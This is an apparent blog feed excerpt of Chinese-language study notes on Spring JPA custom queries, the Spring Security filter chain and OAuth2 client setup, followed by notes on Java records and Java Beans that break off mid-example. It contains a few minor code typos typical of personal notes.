Data</h2><p>除了前面的对于数据库的操作过于简单，我们无需写 SQL 语句以外，在用户的搜索场景中，由于搜索条件的复杂性，导致 Spring JPA 生成的 SQL 语句通常有性能问题。</p><p>所以自己写 SQL 语句查询往往是个好选择，开发者还可以根据自己写的 SQL 语句进行自行优化。</p><p>值得注意的是，在模糊搜索中 <code>CONTAINS</code> 和 <code>LIKE</code> 关键字的性能由数据库的类型决定，谨慎使用。</p><p>此外，有两种索引方式：name index、normal index。前者表示在代码中使用参数名嵌入 SQL 索引，后者表示使用类似 <code>?1</code> 指定参数位来嵌入 SQL 索引。</p><p>例如，查找 SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT post FROM posts WHERE post.title LIKE &quot;%hello%&quot;</span><br></pre></td></tr></table></figure><p>那么在 Spring JPA 中，提供了 <code>@Query</code> 方法可以在 <code>JpaRepository</code> 中使用，语法如下（以 name index 为例）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PostRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;PostInfo, Long&gt; &#123;</span><br><span class="line">    <span class="comment">/* Other methods... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Query(&quot;SELECT post FROM Post post WHERE post.title LIKE CONCAT(&#x27;%&#x27;, :input, &#x27;%&#x27;) &quot;)</span></span><br><span class="line">    List&lt;PostInfo&gt; <span class="title function_">searchPost</span><span class="params">(String input)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Other methods... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到：</p><ul><li>在内嵌 SQL 语句中，name index 前使用 <code>:</code> 来标识；</li><li>由于插入了变量，因此字符串需要拼接而不是直接使用；</li></ul><h2 id="1-11-One-To-Many-Spring-Data"><a href="#1-11-One-To-Many-Spring-Data" class="headerlink" title="1.11 One-To-Many Spring Data"></a>1.11 One-To-Many Spring Data</h2><p>关系型数据库中，有一种关系是一对多的数据关系。例如，一个用户可以对应持有多个订单。</p><p>这种关系在 Spring JPA 中以 <code>@OneToMany</code> 来表示。值得注意的是，这种关系是有关联的，通常要求父数据（One）被删除时，与该父数据关联的子数据（Many）需要一并全部删除，这种删除关系被称为 Cascade（级联），更详细的信息请参见数据库教程。</p><p>此外，如果是一对多的关系，在关系型数据库中通常还要联接表的列，以便联接查询。在 Spring JPA 中还提供了 <code>@JoinColumn</code> 注解，可以注解到要存放关联列的表的列 field 中（通常位于 “Many” 子数据表中）。</p><h1 id="Chapter-2-Spring-Security"><a href="#Chapter-2-Spring-Security" class="headerlink" title="Chapter 2. Spring Security"></a>Chapter 2. Spring Security</h1><h2 id="2-1-Spring-Security-Overview-Servlet-App"><a href="#2-1-Spring-Security-Overview-Servlet-App" class="headerlink" title="2.1 Spring Security Overview (Servlet App)"></a>2.1 Spring Security Overview (Servlet App)</h2><p>强烈建议至少阅读 <a href="https://docs.spring.io/spring-security/reference/servlet/architecture.html">官方文档的 架构总览</a> 章节，以获得对于 Spring Security 在 Servlet 应用中的宏观上的认识。</p><p>总结下来，Spring Security 在 Servlet 应用上的架构有如下几个重要的点：</p><ul><li><p>以过滤器（filter）为核心。Spring Security 内置很多层 Filter：</p><p><img src="imgs/filterchain.png" width="200px"></p><p><img src="imgs/filterchain2.png" height="250px"></p><blockquote><p>Spring Security包含了众多的过滤器，这些过滤器形成了一条链，所有请求都必须通过这些过滤器后才能成功访问到资源。</p><ul><li><code>UsernamePasswordAuthenticationFilter</code> 过滤器用于处理基于表单方式的登录认证；</li><li><code>BasicAuthenticationFilter</code> 用于处理基于HTTP Basic方式的登录验证，后面还可能包含一系列别的过滤器（可以通过相应配置开启）；</li><li><code>FilterSecurityInterceptor</code> 用于判断当前请求身份认证是否成功，是否有相应的权限，当身份认证失败或者权限不足的时候便会抛出相应的异常；</li><li><code>ExceptionTranslationFilter</code> 能够捕获来自 FilterChain 所有的异常，并进行处理。但是它只会处理两类异常： <code>AuthenticationException</code> 和 <code>AccessDeniedException</code>，其它的异常它会继续抛出。</li></ul><p>另外，可以打印出内部的默认部署的 filters 情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.security.web.session.DisableEncodeUrlFilter@404db674,</span><br><span class="line">org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@50f097b5,</span><br><span class="line">org.springframework.security.web.context.SecurityContextHolderFilter@6fc6deb7,</span><br><span class="line">org.springframework.security.web.header.HeaderWriterFilter@6f76c2cc,</span><br><span class="line">org.springframework.security.web.csrf.CsrfFilter@c29fe36,</span><br><span class="line">org.springframework.security.web.authentication.logout.LogoutFilter@ef60710,</span><br><span class="line">org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@7c2dfa2,</span><br><span class="line">org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter@4397a639,</span><br><span class="line">org.springframework.security.web.authentication.ui.DefaultLogoutPageGeneratingFilter@7add838c,</span><br><span class="line">org.springframework.security.web.authentication.www.BasicAuthenticationFilter@5cc9d3d0,</span><br><span class="line">org.springframework.security.web.savedrequest.RequestCacheAwareFilter@7da39774,</span><br><span class="line">org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@32b0876c,</span><br><span class="line">org.springframework.security.web.authentication.AnonymousAuthenticationFilter@3662bdff,</span><br><span class="line">org.springframework.security.web.access.ExceptionTranslationFilter@77681ce4,</span><br><span class="line">org.springframework.security.web.access.intercept.AuthorizationFilter@169268a7]</span><br></pre></td></tr></table></figure></blockquote></li></ul><ul><li><p>Spring Security 认证、授权的大致原理就是，借助这些 filters 判断这个请求是否有效，无效则抛出异常拒绝访问；</p></li><li><p>对 Spring Security 的设置，可以说就是对这些 filters 的配置、自定义；</p><ul><li>配置：可以禁用、启用其中的 filters，为其中的 filters 设置参数等；</li><li>自定义：基于 Spring Security 提供的接口类，自定义 filters；</li></ul></li></ul><p>实际上，Spring Security 相当灵活，能够胜任：认证（像登录工作）、授权（像当前登录用户是否有权限）、外部授权服务器的认证和授权（像 OAuth2 协议）等任务。</p><p>其中，使用用户名-密码的方式认证、授权是最简单的一种，本章不作详细介绍。</p><p>最后，如果你发现自己写了一个配置，测试时却怎么都连不上，可以在 <code>application.properties</code> 内打开测试日志，帮助 debug：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging.level.org.springframework.security</span>=<span class="string">TRACE</span></span><br></pre></td></tr></table></figure><h2 id="2-2-Spring-Security-OAuth2-0"><a href="#2-2-Spring-Security-OAuth2-0" class="headerlink" title="2.2 Spring Security: OAuth2.0"></a>2.2 Spring Security: OAuth2.0</h2><h3 id="2-2-1-OAuth2-0-Overview"><a href="#2-2-1-OAuth2-0-Overview" class="headerlink" title="2.2.1 OAuth2.0 Overview"></a>2.2.1 OAuth2.0 Overview</h3><p>Spring Security 除了普通的自定义用户名-密码验证，还支持 OAuth2.0 外部的授权服务器验证。</p><p>在了解 Spring Security 如何操作前，先了解 OAuth2.0 的协议是什么。</p><p>查看 <a href="https://www.rfc-editor.org/rfc/rfc6749">RFC 6749 标准</a>，其提供了抽象的协议流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+--------+                               +---------------+</span><br><span class="line">|        |--(A)- Authorization Request -&gt;|   Resource    |</span><br><span class="line">|        |                               |     Owner     |</span><br><span class="line">|        |&lt;-(B)-- Authorization Grant ---|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(C)-- Authorization Grant --&gt;| Authorization |</span><br><span class="line">| Client |                               |     Server    |</span><br><span class="line">|        |&lt;-(D)----- Access Token -------|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(E)----- Access Token ------&gt;|    Resource   |</span><br><span class="line">|        |                               |     Server    |</span><br><span class="line">|        |&lt;-(F)--- Protected Resource ---|               |</span><br><span class="line">+--------+                               +---------------+</span><br></pre></td></tr></table></figure><p>简单来说，OAuth2.0 协议的过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(A) 用户（就是 resource owner）访问客户端，客户端将用户导向认证服务器。</span><br><span class="line"></span><br><span class="line">(B) 用户选择是否给予客户端授权。</span><br><span class="line"></span><br><span class="line">(C) 假设用户给予授权，认证服务器先生成一个授权码，并返回给用户，认证服务器将用户导向客户端事先指定的“重定向URI”（redirect uri），同时附上一个授权码（code）。</span><br><span class="line"></span><br><span class="line">(D) 客户端收到授权码，附上早先的“重定向URI”，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。</span><br><span class="line"></span><br><span class="line">(E) 认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）或更新令牌（refresh token）。</span><br><span class="line"></span><br><span class="line">(F) 客户端验证身份令牌信息的完整性和正确性，并解析获取当前用户信息。</span><br></pre></td></tr></table></figure><p>这就是 OAuth2.0 协议最规范、最完整、最常用、最安全的使用方法：授权码模式。RFC 6749 标准还规定了其他 3 种获取令牌（token）的模式：</p><ul><li>简化模式；</li><li>密码模式；</li><li>客户端模式；</li></ul><p>这些方法的安全性和规范性依次递减。</p><p>此外，我们从上图可知，一个后端程序想要使用 OAuth2.0，我们至少需要搭建：</p><ul><li>一个 OAuth2.0 客户端（用于处理用户、授权服务器、资源服务器之间的交互）；</li><li>一个授权服务器（用户的认证信息存放位置）；</li><li>一个资源服务器（用户的资源存放位置）；</li></ul><p>如果你使用第三方的 OAuth2.0 认证服务，就是说，使用第三方的认证服务来获取这个用户的有限的身份信息，那么只需要开发自己的客户端（client）即可，<strong>授权服务器（Authorization Server）和资源服务器（Resource Server）都是由第三方提供的</strong>。</p><blockquote><p>举个例子，Github 第三方授权见过吧？很多网站都支持 QQ / 微信第三方登录吧？它们的底层都可以使用 OAuth2.0 来完成。</p><p>使用 OAuth2.0 可以验证当前的用户的身份，只不过是：在不需要知道用户的密钥的前提下，将用户的认证、授权委托给第三方（授权服务器）来完成，客户端（client）只要询问第三方，这个用户合不合法、用户的基本信息是什么（<u>有限的信息，给多少取决于第三方授权服务器，以及用户在弹出的授权框里自己指定</u>），就能证明这个用户的身份了。</p></blockquote><p>本章也不说 OAuth2.0 授权服务器、资源服务器的搭建，只说 OAuth2.0 客户端的搭建。</p><p>如果使用的是第三方授权服务器、资源服务器，一般第三方平台会给你接口说明（客户端怎么访问授权服务器和资源服务器），并要求你出示自己的身份，注册一对 <code>client_id</code>、<code>client_key</code>；</p><p>为什么需要你注册一个 <code>client_id/client_key</code> 呢？这是为了保护 App 使用者（最终用户）的合法权益，确保客户端是可信的，不是什么伪造的中间人都可以访问授权服务器、读取用户信息的。</p><p>有了这对 <code>client_id</code>、<code>client_key</code>，就可以认证应用开发者和客户端的身份，在与第三方授权服务器通信时携带，就可以确保客户端是合法的。</p><h3 id="2-2-2-OAuth2-0-Client-in-Spring-Security"><a href="#2-2-2-OAuth2-0-Client-in-Spring-Security" class="headerlink" title="2.2.2 OAuth2.0 Client in Spring Security"></a>2.2.2 OAuth2.0 Client in Spring Security</h3><blockquote><p>那么 Spring Security 是怎么支持 OAuth2.0 的呢？我们不妨先了解一下 Spring Security 的历史：</p><p>大约十年前，Spring 引入了一个社区驱动的开源项目 Spring Security OAuth， 并将其纳入 Spring 项目组合中。到今天为止，这个项目己经发展成为一个成熟的项目，可以支持大部分 OAuth 规范，包括资源服务器、 客户端和授权服务器等。</p><p>然而早期的项目存在一些问题，例如：</p><ul><li>OAuth 是在早期完成的，开发者无法预料未来的变化以及这些代码到底要被怎么使用， 这导致很多 Spring 项目提供了自己的 OAuth 支持，也就带来了 OAuth 支持的碎片化。</li><li>最早的OAuth项目同时支特 OAuth1.0 和 OAuth2.0，而现在 OAuth1.0 早已经不再使用， 可以放弃了。</li><li>现在我们有更多的库可以选择，可以在这些库的基础上去开发，以便更好地支持JWT等新技术。</li></ul><p>基于以上这些原因，官方决定重写 Spring Security OAuth，以便更好地协调 Spring 和 OAuth，并简化代码库，使 Spring 的 OAuth 支持更加灵活。然而，在重写的过程中，发生了不少波折。</p><p>2018年1月30日，Spring 官方发了一个通知，表示要逐渐停止现有的 OAuth2支持，然后在 Spring Security  5中构建下一代 OAuth2.0 支持。这么做的原因是因为当时 OAuth2 的落地方案比较混乱，在 Spring Security  OAuth、 Spring Cloud Security、Spring Boot 1.5.x 以及当时最新的Spring Security  5.x 中都提供了对 OAuth2 的实现。以至于当开发者需要使用 OAuth2 时，不得不问，到底选哪一个依赖合适呢？</p><p>所以 Spring 官方决定有必要将 OAuth2.0 的支持统一到一个项目中，以便为用户提供明确的选择，并避免任何潜在的混乱，同时 OAuth2.0 的开发文档也要重新编写，以方便开发人员学习。所有的决定将在 Spring Security 5 中开始，构建下一代 OAuth2.0 的支持。从那个时候起，Spring Security OAuth  项目就正式处于维护模式。官方将提供至少一年的错识/安全修复程序，并且会考虑添加次要功能，但不会添加主要功能。同时将 Spring Security OAuth 中的所有功能重构到 Spring Security 5.x 中。</p><p>到了2019年11月14日，Spring 官方又发布一个通知，这次的通知首先表示 Spring Security OAuth 在迁往  Spring Security 5.x 的过程非常顺利，大部分迁程工作已经完成了，剩下的将在 5.3 版本中完成迁移，在迁移的过程中还添加了许多新功能。包括对 OpenID Connect1.0 的支持。同时还宣布将不再支持授权服务器，不支持的原因有两个：</p><ol><li>在2019年，已经有大量的商业和开源授权服务器可用；</li><li>授权服务器是使用一个库来构建产品，而 Spring Security 作为框架，并不适合做这件事情。</li></ol><p>一石激起千层浪，许多开发者表示对此难以接受。这件事也在Spring 社区引发了激烈的讨论，好在 Spring 官方愿意倾听来自社区的声音。</p><p>到了2020年4月15日，Spring 官方宣布启动 Spring Authorization server 项目。这是一个由  Spring Security 团队领导的社区驱动的项目，致力于向 Spring 社区提供 Authorization  Server支持，也就是说，Spring 又重新支持授权服务器了。</p><p>于是在 2020年8月21日，Spring Authorization Server 0.0.1 正式发布。</p></blockquote><p>当前的 Spring Security 对于 OAuth2.0 的支持主要分为 2 个部分：</p><ul><li>OAuth2.0 Client（内置提供了强大的 OAuth2.0 登录功能）；</li><li>OAuth2.0 Resources Server；</li></ul><p>授权服务器的部分已经从 Spring Security 项目中独立出去了（Spring Authorization Server）。</p><p>这里就详细讨论 OAuth2.0 客户端的设计和使用。在 Gradle 中这么导入：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-oauth2-client&#x27;</span></span><br></pre></td></tr></table></figure><p>Spring Security OAuth2.0 Client 支持：</p><ul><li>认证：JWT Bearer 令牌的处理；</li><li>授权：授权码的保存、刷新令牌的操作、客户端认证信息的操作、用户认证信息的保存……</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前置条件：WEB 基础（Socket，HTTP 整套规范），SQL 和数据库基础，Java 语言基础、前端基础（至少了解一种前端框架，本文以 React 为例）；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Chapter-0-Basic-</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Java" scheme="https://blog.sjtuxhw.top/tags/Java/"/>
    
    <category term="Spring" scheme="https://blog.sjtuxhw.top/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Java 学习笔记（二）</title>
    <link href="https://blog.sjtuxhw.top/technical/java-basic-2/"/>
    <id>https://blog.sjtuxhw.top/technical/java-basic-2/</id>
    <published>2024-05-02T10:09:13.000Z</published>
    <updated>2024-10-25T14:00:17.137Z</updated>
    
    <content type="html"><![CDATA[<p><i>Reference: Oracle Documentation</i></p><h1 id="Chapter-3-Java-Record-amp-Java-Bean"><a href="#Chapter-3-Java-Record-amp-Java-Bean" class="headerlink" title="Chapter 3. Java Record &amp; Java Bean"></a>Chapter 3. Java Record &amp; Java Bean</h1><h2 id="3-1-Java-Record"><a href="#3-1-Java-Record" class="headerlink" title="3.1 Java Record"></a>3.1 Java Record</h2><p>在 Java 14 以后，官方引入了新的 Java 关键字：<code>record</code>；</p><p>那么这个 <code>record</code> 关键字究竟有什么用处呢？它和我们熟知的 <code>class / interface / abstract class</code> 又有什么区别呢？其实在 Java 14 以前，有一种需求写起来非常的麻烦，正因为这种需求才产生出了 <code>record</code> 关键字。这个需求是什么呢？</p><p>举个例子，假如现在有个应用场景，想要定义一个数据类型，<strong>它只是用来存放一些数据</strong>（例如数据库查询的结果，或者是某个服务的返回信息）。</p><p>在很多实际情况下，我们希望使用这些数据就像 Java 内置基本类型一样，是不可变数据类型。这样做有几点好处：</p><ul><li><p>复制构造时，不是引用传递，因此是深拷贝。这样使用起来和基本类型一样方便，但是又不用担心改错源数据（非引用链接）；</p></li><li><p>确保数据在多线程情况下无需同步，线程安全！</p></li></ul><p>回忆下基础篇中的知识，要让 Java 类型（对象）behaves like 不可变数据类型，就必须确保：</p><ul><li>类型中的每个数据域都是 <u>私有的、常量的</u>（<code>private</code>，<code>final</code>）；</li><li>每个数据域都只能通过 <code>getter</code> 方法获取，不能有任何 <code>setter</code> 方法；</li><li>必须存在公有构造函数，并且构造函数内初始化各个数据域（常量只能这么做）；</li><li>Object 基类继承函数 <code>equals</code> 返回 <code>true</code> 当且仅当类中的每个数据域都相等；</li><li>Object 基类继承函数 <code>hashCode</code> 在类中的每个数据域都相等时，一定返回一样的值；</li><li>Object 基类继承函数 <code>toString</code> 最好包含 类名 和 每个数据域的名称和值； </li></ul><p>好了，假设我们现在想要保存一个 “联系人” 的信息，只包含一个名称、住址。我要定义这个类为不可变数据类型，那么：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String address;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Persion</span><span class="params">(String name, String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(name, address);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Person)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Person</span> <span class="variable">other</span> <span class="operator">=</span> (Person)obj;</span><br><span class="line">            <span class="keyword">return</span> Objects.equals(name, other.name) &amp;&amp; Objects.equals(address, other.address);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person [name=&quot;</span> + name + <span class="string">&quot;, address=&quot;</span> + address + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* standard getters */</span></span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    String <span class="title function_">getAddress</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.address; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>……这很难评，仅仅为了将两个基本类型保存为不可变的数据类型，如此大费周章。具体来说，有几点坏处：</p><ul><li><p>许多代码都是和业务逻辑无关的 “模板代码”；</p></li><li><p>这种写法模糊了这个类原本的作用（语义模糊）：仅仅是按不可变数据类型保存两个基本类型而已！</p></li><li><p>很差的扩展性。</p><blockquote><p>现在还只有两个属性，那如果我要再加一个属性呢？</p><p>那么我要修改构造函数、修改<strong>所有的重载方法</strong>、为新的属性添加访问器。可谓麻烦。</p></blockquote></li></ul><hr><p>于是，在 Java 14 中，定义了新的关键字 <code>record</code>，它的含义就是告诉编译器，这是个保存数据的类型，要把它定义成不可变的样子！</p><p>经过上面的铺垫，你就能理解 <code>record</code> 关键字的意义，以及它的作用了。</p><h3 id="3-1-1-记录类型的构造函数"><a href="#3-1-1-记录类型的构造函数" class="headerlink" title="3.1.1 记录类型的构造函数"></a>3.1.1 记录类型的构造函数</h3><p>Java 规定，在使用 <code>record</code> 关键字定义类型时，<strong>默认构造函数存在参数，且与私有数据域一一对应</strong>。</p><p>允许特殊的定义方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Person</span><span class="params">(String name, String address)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>你没有看错，上面一行等价于之前用 <code>class</code> 定义的一大堆代码……</p><p>除了简化了默认构造函数，你仍然在此基础上自定义构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 只需括号内声明数据记录类所有的私有数据成员即可 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Person</span><span class="params">(String name, String address)</span> &#123;</span><br><span class="line">    <span class="comment">/* 简化的默认构造函数（被称为 compact constructor），不需要写形参列表、不需要手动对其初始化 */</span></span><br><span class="line">    <span class="keyword">public</span> Person &#123;</span><br><span class="line">        <span class="comment">/* 一般没啥事能做，你可以检查检查传入的参数是否为 null */</span></span><br><span class="line">        Objects.requireNotNull(name);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 可以重载构造函数 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="comment">/* 允许委托构造 */</span></span><br><span class="line">        <span class="built_in">this</span>(name, <span class="string">&quot;UNKNOWN&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-2-记录类型的访问器"><a href="#3-1-2-记录类型的访问器" class="headerlink" title="3.1.2 记录类型的访问器"></a>3.1.2 记录类型的访问器</h3><p>和一般的访问器命名法有些差别，记录类型默认的访问器不使用 <code>getXXX</code> 命名，而是使用 <strong>数据成员的名字</strong> 直接命名。</p><p>另外，一般真的不用改记录类型的访问器，如果需要改，那么说明这个类一定不是单纯的数据记录类，请用普通类型定义！</p><h3 id="3-1-3-记录类型的-Object-重写方法"><a href="#3-1-3-记录类型的-Object-重写方法" class="headerlink" title="3.1.3 记录类型的 Object 重写方法"></a>3.1.3 记录类型的 Object 重写方法</h3><p>根据定义，<code>equals</code>、<code>hashCode</code> 一般都不需要你再次重写。</p><p>在某些情况下，你可能想要自定义 <code>toString</code>，这没有问题，就和普通的类重写的方法一样。</p><h3 id="3-1-4-记录类型的静态变量和方法"><a href="#3-1-4-记录类型的静态变量和方法" class="headerlink" title="3.1.4 记录类型的静态变量和方法"></a>3.1.4 记录类型的静态变量和方法</h3><p>虽然不允许有公有可写的属性，但记录类型允许定义 <strong>静态变量、静态方法，它们都可以是公有的</strong>。</p><p>你可以把它们理解成对整个数据类型的配置，或者解释。</p><h2 id="3-2-Java-Bean"><a href="#3-2-Java-Bean" class="headerlink" title="3.2 Java Bean"></a>3.2 Java Bean</h2><p>嗯，实际上，还有一种约定和 Java Record 应用很像的 <strong>Java 类型定义规范</strong>，它的名字是 Java Bean（Java 豆？）。</p><p>没错，Java Bean 是 Java 的一种类型定义规范，和 record 类似，它们的共性是<u>用一个类来盛放一组数据</u>。</p><p>但是，record 追求的是不可变数据类型（数据域不可变性）、一条记录的不可变性和易操作性，而 bean 追求的是：</p><ol><li><p>数据的取出放入的接口不变，保证兼容性；</p></li><li><p>数据序列化（serializable）和<u>传输方便</u>（注：Java Bean 出现的原因就在于此，为了让一组相关数据传输方便）；</p><blockquote><p>不过 Record 也很简单，传输起来也方便，但是不可变，应该看业务需求选择。</p></blockquote></li></ol><p>所以，Java Bean 没有像 record 一样，它规定了一组类型定义方式：</p><ol><li>提供一个默认的无参构造函数；</li><li>需要被序列化并且实现了 Serializable 接口；</li><li>可能有一系列可读写属性，并且一般是 private 的；</li><li>有一系列的 getter 或 setter 方法；</li></ol><p>感性理解一下：想象一下存在这样一个箱子，其内部被分割成几个格子，每个格子用来存放特定的物品，工人取出或者放入物品后封箱，然后叫了个快递把箱子发出去了。这个箱子就是 Java Bean，取出、放入就是 getter、setter，物品就是属性，封箱发出就是序列化和传输。</p><p>举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String newName)</span> &#123;</span><br><span class="line">        name = newName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> newAge)</span> &#123;</span><br><span class="line">        age = newAge;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title 